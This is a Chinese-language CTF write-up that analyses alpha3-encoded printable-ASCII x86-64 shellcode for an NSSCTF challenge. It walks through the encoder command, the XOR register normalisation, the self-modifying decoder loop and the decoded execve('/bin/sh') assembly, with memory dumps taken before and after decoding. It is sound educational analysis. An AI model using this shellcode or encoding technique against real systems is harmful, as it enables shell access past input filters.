# Printable ASCII Shellcode 原理分析

> 题目: `safe_shellcode` — NSSCTF
> 限制: shellcode 只能使用 `0x30`(`'0'`) ~ `0x7a`(`'z'`) 之间的可打印 ASCII 字符

---

## 来源分析

该 shellcode 由 **alpha3** (ALPHA3) 编码器生成，64 位 mixedcase 模式。

特征：
- 以 `P` (`push rax`, `0x50`) 开头
- 全部字符在 `0`-`z` 范围内

生成方式：
```bash
python3 ./ALPHA3.py x64 ascii mixedcase --input="shellcode.bin" > encoded.txt
```

---

## 核心原理

**自修改代码 (Self-Modifying Code)**

Shellcode 全部由可打印 ASCII 字符构成，执行时：

1. **Prologue** (`0x00-0x27`, 约 40 字节) — 计算解码器需要的 key 值
2. **Decoder Loop** (`0x28-0x38`, 约 17 字节) — 逐字节 XOR 解码，将部分数据改为真实指令
3. **Execve Shellcode** (`0x39-0x68`, 约 48 字节) — 解码后落地的 `execve("/bin/sh")` syscall

---

## 关键技巧

### 1. Push/Pop 操控栈

x86-64 中单字节 `push`/`pop` 指令恰好落在 ASCII 范围内：

| 字符 | 字节 | 指令 |
|------|------|------|
| `P` | `0x50` | `push rax` |
| `Q` | `0x51` | `push rcx` |
| `R` | `0x52` | `push rdx` |
| `S` | `0x53` | `push rbx` |
| `T` | `0x54` | `push rsp` |
| `U` | `0x55` | `push rbp` |
| `V` | `0x56` | `push rsi` |
| `W` | `0x57` | `push rdi` |
| `X` | `0x58` | `pop rax` |
| `Y` | `0x59` | `pop rcx` |
| `Z` | `0x5a` | `pop rdx` |

通过 `push imm32`（`h` = `0x68`）可以压入可打印的 4 字节立即数。

### 2. 寄存器归一化 (Self-Normalizing XOR)

题目中 `rsi` 初始值不确定，用两次 XOR 将其固定：

```asm
xor [rcx], esi    ; [rcx] = KNOWN_VAL XOR esi_old
xor esi, [rcx]    ; esi   = esi_old XOR (KNOWN_VAL XOR esi_old) = KNOWN_VAL
```

**无论 esi 初始值是什么，两次 XOR 后都被归一化为已知常量。**

此例中 KNOWN_VAL = `0x36363630`（`"0666"` 小端）。

### 3. 指令重解释 (Instruction Polyglot)

同一段字节在解码前和解码后有完全不同含义。例如：

- 解码前 `6b 44 71 57 30` = `kDqW0`（可打印）
- 解码后成了 `6b 44 71 57 30` → `imul eax, dword ptr [rcx + rsi*2 + 0x57], 0x30`

解码器**逐字节 XOR** 修改后续指令的字节，使其从 "可打印的填充数据" 变成 "真正的 shellcode 指令"。

### 4. 64位 execve 构造技巧

解码后的 shellcode 使用了一段精巧的字符串构造：

```asm
; 构造 "/bin//sh" (8字节，无 null)
movabs rax, 0x732f2f2f6e69622f   ; "/bin//s"
push rax
mov rdi, rsp                      ; rdi 指向部分字符串

; 修正为 "/bin/sh\0" 
push 0x1016972
xor dword ptr [rsp], 0x1010101   ; 0x7269 ^ 0x01010101 = 0x7368 → "sh"
                                  ; 且产生 null 字节作为结尾
; 构造 argv = ["/bin//sh", NULL]
xor esi, esi
push rsi                          ; NULL
push 8
pop rsi
add rsi, rsp                      ; rsi 指向栈上的字符串
push rsi                          ; argv[0] = ptr to "/bin//sh"
mov rsi, rsp                      ; rsi = argv

xor edx, edx                      ; envp = NULL
push 0x3b
pop rax
syscall                           ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
```

---

## 完整执行流程

### Prologue 寄存器追踪

以 `Ph0666TY1131Xh333311k13X` 片段为例：

```asm
push rax                        ; 保存 rax (= &buff)
push 0x36363630                 ; 压入可打印常量
push rsp / pop rcx              ; rcx = 指向栈上常量
xor [rcx], esi                  ; [rcx]  ^= esi
xor esi, [rcx]                  ; esi  ^= [rcx]  → esi = 0x36363630 (归一化)
pop rax                         ; 清理栈
push 0x33333333
xor [rcx], esi                  ; [rcx] = 0x33333333 ^ 0x36363630 = 0x05050503
imul esi, [rcx], 0x33           ; esi   = 0x05050503 * 0x33 = 0xffffff99
pop rax                         ; 清理

push 0x69                       ; 压入 'i'
push rsi                        ; 压入 0xffffff99
xor [rcx], esi                  ; [rcx] = 0x69 ^ 0xffffff99 = 0xfffffff0
movsxd rsi, [rcx]               ; rsi   = sign_ext(0xfffffff0) = -0x10
pop rdx                         ; rdx   = 0xffffff99
pop rax                         ; 清理
pop rcx                         ; rcx   = 原始 rax = &buff
```

此时状态：
- `rcx` = **&buff** (0x4040c0) — 解码基址
- `rsi` = **-0x10** — 解码索引 (从负开始，循环递增)
- `rdx` = **0xffffff99** — 解码 key 的一部分

### Decoder Loop

```asm
; 地址 BSS+0x28, 对应 raw: 48 ff c6 6b 44 71 57 30
; 输入时 rsi 从 -0x10 递增至 0x22

inc rsi                                        ; 索引 +1
imul eax, dword ptr [rcx + rsi*2 + 0x57], 0x30 ; 计算 XOR key
xor al, byte ptr [rcx + rsi*2 + 0x58]          ; 与编码数据 XOR
xor byte ptr [rcx + rsi + 0x48], al            ; 写入解码结果
jne loop                                       ; 若 al != 0 继续
```

循环从 `rsi = -0x10` 到 `rsi = 0x22`，逐字节解码约 50 个字节（BSS+0x38 ~ BSS+0x6a）。

解码器自身的循环指令 (`inc`/`imul`/`xor`/`jne`) 也是**从可打印字节解码而来**的——它们在解码前是填充数据，解码后才变成有效的循环指令。

### 解码前后的内存对比

```
BSS+0x28:  48 66 39 6b 44 71 57 30   解码前: Hf9kDqW0
BSS+0x30:  32 44 71 58 30 44 31 48   解码前: 2DqX0D1H
BSS+0x38:  75 33 4d 32 47 30 5a 32   解码前: u3M2G0Z2
BSS+0x40:  6f 34 48 30 75 30 50 31   解码前: o4H0u0P1
BSS+0x48:  36 30 5a 30 67 37 4f 30   解码前: 60Z0g7O0
BSS+0x50:  5a 30 43 31 30 30 79 35   解码前: Z0C100y5
BSS+0x58:  4f 33 47 30 32 30 42 32   解码前: O3G020B2
BSS+0x60:  6e 30 36 30 4e 34 71 30   解码前: n060N4q0
BSS+0x68:  6e 32 74 30 42 30 30 30   解码前: n2t0B000

BSS+0x28:  48 ff c6 6b 44 71 57 30   解码后: inc rsi / imul ...
BSS+0x30:  75 ee 6a 68 48 b8 2f 62   解码后: jne / push / movabs...
BSS+0x38:  69 6e 2f 2f 2f 73 50 48   解码后: "in///sPH"
BSS+0x40:  89 e7 68 72 69 01 01 81   解码后: mov rdi,rsp / push ...
BSS+0x48:  34 24 01 01 01 01 31 f6   解码后: xor [rsp]... / xor esi,esi
BSS+0x50:  56 6a 08 5e 48 01 e6 56   解码后: push rsi / push 8 / pop rsi / add rsi,rsp / push rsi
BSS+0x58:  48 89 e6 31 d2 6a 3b 58   解码后: mov rsi,rsp / xor edx / push 0x3b / pop rax
BSS+0x60:  0f 05 30 42 30 30 30 00   解码后: syscall (剩余为填充)
```

---

## 总结

Printable ASCII Shellcode 的核心技术：

| 技术 | 作用 |
|------|------|
| **Push/Pop 指令** | 用 ASCII 字符操控栈和寄存器 |
| **可打印立即数** | `push 0x36363630` 等全数字常量 |
| **Self-Normalizing XOR** | 消除未知寄存器值的影响 |
| **自修改代码** | 运行中将可打印字节改写为真实指令 |
| **指令重解释** | 同一字节序列在不同阶段有不同含义 |
| **XOR 构造字符串** | 用 XOR 修正字符串并产生 null 结尾 |
